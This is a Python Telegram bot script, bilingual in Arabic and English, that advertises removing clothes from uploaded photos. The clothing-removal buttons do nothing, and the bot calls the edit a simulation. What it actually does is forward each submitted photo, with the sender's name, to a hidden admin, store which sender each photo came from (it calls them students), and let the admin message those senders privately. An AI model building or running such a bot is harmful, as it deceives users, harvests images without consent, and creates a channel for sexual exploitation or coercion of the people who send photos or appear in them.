import telebot
from telebot import types
import json
import os
from datetime import datetime
import threading
import time
import logging

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

bot = telebot.TeleBot(BOT_TOKEN)

# 🔁 ملف تخزين البيانات
DATA_FILE = "user_data.json"
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, "r") as f:
        user_data = json.load(f)
else:
    user_data = {}

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(user_data, f)

# ⏳ إعادة تعيين العداد يوميًا
def daily_reset():
    while True:
        now = datetime.utcnow().strftime("%H:%M")
        if now == "00:00":
            for uid in user_data:
                user_data[uid]["used"] = 0
            save_data()
        time.sleep(60)

threading.Thread(target=daily_reset, daemon=True).start()

# 📦 قاعدة الربط بين الصور والطلاب
student_lookup = {}

# ⬇️ /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id,
        "👀 تخيّل صورتك تتعدّل بثواني…\n"
        "💋 تقدر تشوفها بدون ملابس، أو بملامح أحلى.\n"
        "📸 أرسل صورة الآن وخلّنا نبدأ...\n\n"
        "👀 Imagine your photo transformed in seconds…\n"
        "💋 See it with no clothes, or with enhanced features.\n"
        "📸 Send a photo now... let’s get started.")

# ⬇️ إرسال صورة
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = str(message.chat.id)
    if user_id not in user_data:
        user_data[user_id] = {"used": 0}
    if user_data[user_id]["used"] >= 3:
        bot.send_message(message.chat.id, "❌ لقد استهلكت الحد اليومي (3 صور). جرّب غداً.")
        return

    # عرض الخيارات فقط بدون callback
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("إزالة الملابس 🔞 / Remove Clothes", callback_data="nude"))
    markup.add(types.InlineKeyboardButton("تعديل الوجه 💄 / Edit Face", callback_data="face"))
    markup.add(types.InlineKeyboardButton("تحسين الصورة 📸 / Enhance Photo", callback_data="quality"))

    bot.send_message(message.chat.id,
        "اختر نوع التعديل المطلوب (محاكاة فقط):\nChoose the desired edit type (simulation only):",
        reply_markup=markup)

    # إرسال الصورة للمشرف وتخزين الربط
    try:
        file_id = message.photo[-1].file_id
        caption = f"📥 صورة جديدة من الطالب / New photo from student: {message.from_user.first_name or 'Unknown'}"
        sent = bot.send_photo(ADMIN_ID, file_id, caption=caption)
        student_lookup[sent.message_id] = message.chat.id
        user_data[user_id]["used"] += 1
        save_data()
    except Exception as e:
        print(f"❌ Error sending photo to admin: {e}")

# ⬇️ رد المشرف على صورة
@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID and m.reply_to_message is not None)
def handle_admin_reply(message):
    if not message.reply_to_message.photo:
        bot.send_message(ADMIN_ID, "⚠️ يجب الرد على صورة.")
        return

    replied_msg_id = message.reply_to_message.message_id
    student_id = student_lookup.get(replied_msg_id)

    if student_id:
        try:
            bot.send_message(student_id, f"📩 رسالة من المشرف:\n\n{message.text}")
            bot.send_message(ADMIN_ID, "✅ تم إرسال الرد.")
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ فشل الإرسال: {e}")
    else:
        bot.send_message(ADMIN_ID, "⚠️ لم يتم العثور على الطالب.")

# ⬇️ أمر /رد
@bot.message_handler(commands=['رد'])
def manual_reply(message):
    if message.chat.id != ADMIN_ID:
        return
    args = message.text.split(" ", 2)
    if len(args) < 3:
        bot.send_message(ADMIN_ID, "❗ الصيغة: /رد student_id الرسالة")
        return
    try:
        student_id = int(args[1])
        reply_text = args[2]
        bot.send_message(student_id, f"📩 رسالة من المشرف:\n\n{reply_text}")
        bot.send_message(ADMIN_ID, "✅ تم إرسال الرسالة.")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"❌ خطأ في الإرسال: {e}")

print("✅ Bot is running...")
bot.polling()
